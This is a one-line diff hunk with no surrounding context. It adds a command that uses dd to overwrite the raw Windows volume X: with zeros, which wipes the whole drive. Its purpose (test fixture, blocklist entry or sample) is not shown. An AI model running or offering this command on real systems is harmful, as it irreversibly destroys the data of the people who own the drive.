@@ -1,0 +1,1 @@
+dd if=/dev/zero of=\\.\X: bs=1M
